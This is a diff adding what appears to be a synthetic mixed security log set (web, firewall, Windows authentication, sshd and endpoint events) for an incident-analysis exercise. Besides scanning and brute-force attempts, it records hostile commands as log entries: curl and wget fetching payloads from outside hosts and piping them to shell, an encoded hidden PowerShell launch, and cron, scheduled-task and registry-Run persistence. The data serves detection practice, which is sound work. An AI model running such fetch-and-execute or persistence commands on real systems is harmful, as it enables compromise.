@@ -1,0 +1,126 @@
+2025-12-21T09:00:01Z 198.51.100.10 GET / 200 1240 Mozilla/5.0
+2025-12-21T09:00:05Z 198.51.100.10 GET /assets/app.js 200 53120 Mozilla/5.0
+2025-12-21T09:00:09Z 198.51.100.10 GET /login 200 980 Mozilla/5.0
+2025-12-21T09:00:15Z 198.51.100.10 POST /login 200 740 Mozilla/5.0
+2025-12-21T09:00:20Z 198.51.100.10 GET /dashboard 200 8410 Mozilla/5.0
+2025-12-21T09:00:25Z 198.51.100.10 GET /profile 200 2210 Mozilla/5.0
+2025-12-21T09:00:30Z 198.51.100.10 GET /logout 200 410 Mozilla/5.0
+2025-12-21T09:01:02Z 203.0.113.77 GET /robots.txt 200 210 Googlebot/2.1
+2025-12-21T09:01:04Z 203.0.113.77 GET /sitemap.xml 200 9320 Googlebot/2.1
+2025-12-21T09:01:10Z 45.83.193.10 GET /wp-login.php 404 210 curl/7.68.0
+2025-12-21T09:01:12Z 45.83.193.10 GET /.env 404 210 curl/7.68.0
+2025-12-21T09:01:14Z 45.83.193.10 GET /admin 403 220 curl/7.68.0
+2025-12-21T09:01:16Z 45.83.193.10 GET /admin/login 403 220 curl/7.68.0
+2025-12-21T09:01:18Z 45.83.193.10 GET /backup.zip 404 210 curl/7.68.0
+2025-12-21T09:01:20Z 45.83.193.10 GET /config 403 220 curl/7.68.0
+2025-12-21T09:01:22Z 45.83.193.10 GET /phpinfo.php 404 210 curl/7.68.0
+2025-12-21T09:01:24Z 45.83.193.10 GET /api 200 980 curl/7.68.0
+2025-12-21T09:01:26Z 45.83.193.10 GET /api/v1/users 401 310 curl/7.68.0
+2025-12-21T09:01:28Z 45.83.193.10 GET /api/v1/admin 403 220 curl/7.68.0
+2025-12-21T09:02:00Z 128.241.220.82 GET /login 200 980 Mozilla/5.0
+2025-12-21T09:02:05Z 128.241.220.82 POST /login 401 310 Mozilla/5.0
+2025-12-21T09:02:10Z 128.241.220.82 POST /login 401 310 Mozilla/5.0
+2025-12-21T09:02:15Z 128.241.220.82 POST /login 401 310 Mozilla/5.0
+2025-12-21T09:02:20Z 128.241.220.82 POST /login 401 310 Mozilla/5.0
+2025-12-21T09:02:25Z 128.241.220.82 POST /login 401 310 Mozilla/5.0
+2025-12-21T09:02:30Z 128.241.220.82 POST /login 401 310 Mozilla/5.0
+2025-12-21T09:02:35Z 128.241.220.82 GET /forgot-password 200 870 Mozilla/5.0
+2025-12-21T09:03:10Z 203.0.113.45 GET /login 200 980 Mozilla/5.0
+2025-12-21T09:03:55Z 203.0.113.45 POST /login 401 310 Mozilla/5.0
+2025-12-21T09:04:45Z 203.0.113.45 POST /login 401 310 Mozilla/5.0
+2025-12-21T09:05:35Z 203.0.113.45 POST /login 401 310 Mozilla/5.0
+2025-12-21T09:06:25Z 203.0.113.45 POST /login 401 310 Mozilla/5.0
+2025-12-21T09:07:15Z 203.0.113.45 POST /login 401 310 Mozilla/5.0
+2025-12-21T09:07:50Z 91.198.174.192 GET / 200 1240 python-requests/2.28
+2025-12-21T09:07:52Z 91.198.174.192 GET /admin 403 220 python-requests/2.28
+2025-12-21T09:07:54Z 91.198.174.192 GET /admin/config 403 220 python-requests/2.28
+2025-12-21T09:07:56Z 91.198.174.192 GET /api/v1/health 200 120 python-requests/2.28
+2025-12-21T09:07:58Z 91.198.174.192 GET /api/v1/users 401 310 python-requests/2.28
+2025-12-21T09:08:00Z 91.198.174.192 GET /api/v1/tokens 401 310 python-requests/2.28
+2025-12-21T09:08:02Z 91.198.174.192 GET /backup 404 210 python-requests/2.28
+2025-12-21T09:08:04Z 91.198.174.192 GET /.git/config 404 210 python-requests/2.28
+2025-12-21T09:09:00Z 198.51.100.10 GET /products 200 4010 Mozilla/5.0
+2025-12-21T09:09:05Z 198.51.100.10 GET /product/42 200 5120 Mozilla/5.0
+2025-12-21T09:09:10Z 198.51.100.10 GET /cart 200 2140 Mozilla/5.0
+2025-12-21T09:09:15Z 198.51.100.10 POST /checkout 200 980 Mozilla/5.0
+2025-12-21T09:09:20Z 198.51.100.10 GET /order/7812 200 1650 Mozilla/5.0
+2025-12-21T09:09:25Z 198.51.100.10 GET /logout 200 410 Mozilla/5.0
+2025-12-21T09:01:05Z action=deny src=45.83.193.10 dst=10.10.10.10 dpt=22 proto=tcp reason=policy_block
+2025-12-21T09:01:06Z action=deny src=45.83.193.10 dst=10.10.10.10 dpt=3389 proto=tcp reason=policy_block
+2025-12-21T09:01:07Z action=allow src=45.83.193.10 dst=10.10.10.20 dpt=443 proto=tcp reason=web_access
+2025-12-21T09:01:11Z action=deny src=45.83.193.10 dst=10.10.10.20 dpt=445 proto=tcp reason=policy_block
+2025-12-21T09:02:02Z action=allow src=128.241.220.82 dst=10.10.10.20 dpt=443 proto=tcp reason=web_access
+2025-12-21T09:02:03Z action=allow src=128.241.220.82 dst=10.10.10.20 dpt=443 proto=tcp reason=web_access
+2025-12-21T09:03:10Z action=allow src=203.0.113.45 dst=10.10.10.20 dpt=443 proto=tcp reason=web_access
+2025-12-21T09:03:55Z action=allow src=203.0.113.45 dst=10.10.10.20 dpt=443 proto=tcp reason=web_access
+2025-12-21T09:04:45Z action=allow src=203.0.113.45 dst=10.10.10.20 dpt=443 proto=tcp reason=web_access
+2025-12-21T09:07:50Z action=allow src=91.198.174.192 dst=10.10.10.20 dpt=443 proto=tcp reason=web_access
+2025-12-21T09:07:53Z action=deny src=91.198.174.192 dst=10.10.10.10 dpt=1433 proto=tcp reason=policy_block
+2025-12-21T09:07:54Z action=deny src=91.198.174.192 dst=10.10.10.10 dpt=3306 proto=tcp reason=policy_block
+2025-12-21T09:07:55Z action=deny src=91.198.174.192 dst=10.10.10.10 dpt=6379 proto=tcp reason=policy_block
+2025-12-21T09:08:10Z action=allow src=203.0.113.200 dst=10.10.10.10 dpt=3389 proto=tcp reason=rdp_from_vpn
+2025-12-21T09:08:12Z action=allow src=203.0.113.200 dst=10.10.10.10 dpt=3389 proto=tcp reason=rdp_from_vpn
+2025-12-21T09:08:20Z action=allow src=203.0.113.200 dst=10.10.10.10 dpt=5985 proto=tcp reason=winrm_internal
+2025-12-21T09:08:25Z action=allow src=10.10.10.10 dst=54.239.28.85 dpt=443 proto=tcp reason=egress_allowed
+2025-12-21T09:08:30Z action=allow src=10.10.10.10 dst=54.239.28.85 dpt=443 proto=tcp reason=egress_allowed
+2025-12-21T09:09:40Z action=allow src=10.10.10.30 dst=10.10.10.20 dpt=443 proto=tcp reason=health_check
+2025-12-21T09:09:50Z action=allow src=10.10.10.30 dst=10.10.10.20 dpt=443 proto=tcp reason=health_check
+2025-12-21T09:02:40Z,4625,WIN-DC01,svc_web,128.241.220.82,3,0xC000006A,Invalid password
+2025-12-21T09:02:44Z,4625,WIN-DC01,svc_web,128.241.220.82,3,0xC000006A,Invalid password
+2025-12-21T09:02:48Z,4625,WIN-DC01,svc_web,128.241.220.82,3,0xC000006A,Invalid password
+2025-12-21T09:02:52Z,4625,WIN-DC01,svc_web,128.241.220.82,3,0xC000006A,Invalid password
+2025-12-21T09:02:56Z,4625,WIN-DC01,svc_web,128.241.220.82,3,0xC000006A,Invalid password
+2025-12-21T09:03:00Z,4625,WIN-DC01,svc_web,128.241.220.82,3,0xC000006A,Invalid password
+2025-12-21T09:04:10Z,4625,WIN-DC01,Administrator,203.0.113.45,3,0xC000006A,Invalid password
+2025-12-21T09:05:00Z,4625,WIN-DC01,Administrator,203.0.113.45,3,0xC000006A,Invalid password
+2025-12-21T09:05:50Z,4625,WIN-DC01,Administrator,203.0.113.45,3,0xC000006A,Invalid password
+2025-12-21T09:06:40Z,4625,WIN-DC01,Administrator,203.0.113.45,3,0xC000006A,Invalid password
+2025-12-21T09:07:30Z,4625,WIN-DC01,Administrator,203.0.113.45,3,0xC000006A,Invalid password
+2025-12-21T09:08:10Z,4624,WIN-APP01,admin,203.0.113.200,10,0x0,Successful RDP logon
+2025-12-21T09:08:11Z,4672,WIN-APP01,admin,203.0.113.200,10,0x0,Special privileges assigned
+2025-12-21T09:08:20Z,4624,WIN-APP01,admin,203.0.113.200,3,0x0,Network logon
+2025-12-21T09:08:22Z,4624,WIN-APP01,admin,203.0.113.200,3,0x0,Network logon
+2025-12-21T09:08:30Z,4625,WIN-APP01,backup,91.198.174.192,3,0xC000006A,Invalid password
+2025-12-21T09:08:31Z,4625,WIN-APP01,backup,91.198.174.192,3,0xC000006A,Invalid password
+2025-12-21T09:08:32Z,4625,WIN-APP01,backup,91.198.174.192,3,0xC000006A,Invalid password
+2025-12-21T09:09:05Z,4624,WIN-DC01,jdoe,198.51.100.10,3,0x0,Normal login
+2025-12-21T09:09:20Z,4624,WIN-DC01,jdoe,198.51.100.10,3,0x0,Kerberos ticket renewal
+2025-12-21T09:10:00Z,4625,WIN-DC01,jdoe,198.51.100.10,3,0xC000006A,User typo
+2025-12-21T09:10:05Z,4624,WIN-DC01,jdoe,198.51.100.10,3,0x0,Successful login
+Dec 21 09:01:00 web01 sshd[1123]: Accepted publickey for devops from 198.51.100.10 port 53122 ssh2
+Dec 21 09:01:10 web01 sudo: devops : TTY=pts/0 ; USER=root ; COMMAND=/bin/systemctl status nginx
+Dec 21 09:03:05 web01 sshd[1198]: Failed password for invalid user admin from 203.0.113.45 port 60211 ssh2
+Dec 21 09:03:55 web01 sshd[1204]: Failed password for invalid user test from 203.0.113.45 port 60218 ssh2
+Dec 21 09:04:45 web01 sshd[1210]: Failed password for invalid user oracle from 203.0.113.45 port 60231 ssh2
+Dec 21 09:05:35 web01 sshd[1216]: Failed password for invalid user postgres from 203.0.113.45 port 60245 ssh2
+Dec 21 09:06:25 web01 sshd[1222]: Failed password for invalid user ubuntu from 203.0.113.45 port 60260 ssh2
+Dec 21 09:07:40 web01 sshd[1250]: Failed password for root from 91.198.174.192 port 61001 ssh2
+Dec 21 09:07:41 web01 sshd[1250]: Failed password for root from 91.198.174.192 port 61001 ssh2
+Dec 21 09:07:42 web01 sshd[1250]: Failed password for root from 91.198.174.192 port 61001 ssh2
+Dec 21 09:07:43 web01 sshd[1250]: Failed password for root from 91.198.174.192 port 61001 ssh2
+Dec 21 09:07:44 web01 sshd[1250]: Failed password for root from 91.198.174.192 port 61001 ssh2
+Dec 21 09:07:45 web01 sshd[1250]: Failed password for root from 91.198.174.192 port 61001 ssh2
+Dec 21 09:08:10 web01 sshd[1277]: Accepted password for admin from 203.0.113.200 port 61200 ssh2
+Dec 21 09:08:12 web01 sudo: admin : USER=root ; COMMAND=/usr/bin/curl https://54.239.28.85/update.ps1
+Dec 21 09:08:14 web01 sudo: admin : USER=root ; COMMAND=/bin/bash -c "chmod +x /tmp/upd && /tmp/upd"
+Dec 21 09:08:16 web01 sshd[1277]: Disconnected from 203.0.113.200
+Dec 21 09:10:10 web01 sshd[1310]: Failed password for devops from 45.83.193.10 port 62001 ssh2
+Dec 21 09:10:11 web01 sshd[1310]: Failed password for devops from 45.83.193.10 port 62001 ssh2
+Dec 21 09:10:12 web01 sshd[1310]: Failed password for devops from 45.83.193.10 port 62001 ssh2
+2025-12-21T09:08:21Z WIN-APP01 ProcessCreate powershell.exe explorer.exe admin "powershell -NoP -W Hidden -enc SQBFAFgA..."
+2025-12-21T09:08:22Z WIN-APP01 NetworkConnect powershell.exe - admin "dst=54.239.28.85:443"
+2025-12-21T09:08:23Z WIN-APP01 FileCreate powershell.exe - admin "C:\Users\admin\AppData\Local\Temp\upd.ps1"
+2025-12-21T09:08:25Z WIN-APP01 ProcessCreate cmd.exe powershell.exe admin "cmd /c schtasks /Create /SC MINUTE /MO 15 /TN Upd /TR powershell.exe"
+2025-12-21T09:08:26Z WIN-APP01 RegistrySet powershell.exe - admin "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Upd"
+2025-12-21T09:08:30Z WIN-APP01 ProcessCreate rundll32.exe cmd.exe admin "rundll32.exe C:\Users\admin\AppData\Local\Temp\x.dll,Entry"
+2025-12-21T09:08:13Z WEB01 ProcessCreate curl bash root "curl -s https://54.239.28.85/update.ps1 -o /tmp/upd"
+2025-12-21T09:08:15Z WEB01 ProcessCreate bash - root "/bin/bash -c chmod +x /tmp/upd && /tmp/upd"
+2025-12-21T09:08:17Z WEB01 NetworkConnect /tmp/upd - root "dst=54.239.28.85:443"
+2025-12-21T09:08:19Z WEB01 ProcessCreate crontab bash root "crontab -l | { cat; echo '*/15 * * * * /tmp/upd'; } | crontab -"
+2025-12-21T09:09:10Z WEB01 ProcessCreate sh - www-data "sh -c 'wget http://45.83.193.10/a.sh -O- | sh'"
+2025-12-21T09:09:12Z WEB01 NetworkConnect wget - www-data "dst=45.83.193.10:80"
+2025-12-21T09:10:20Z WIN-APP01 ProcessCreate lsass.exe - SYSTEM "normal"
+2025-12-21T09:10:30Z WIN-APP01 ProcessCreate powershell.exe explorer.exe jdoe "powershell Get-Help"
+2025-12-21T09:10:40Z WIN-APP01 NetworkConnect chrome.exe - jdoe "dst=10.10.10.20:443"
+
+
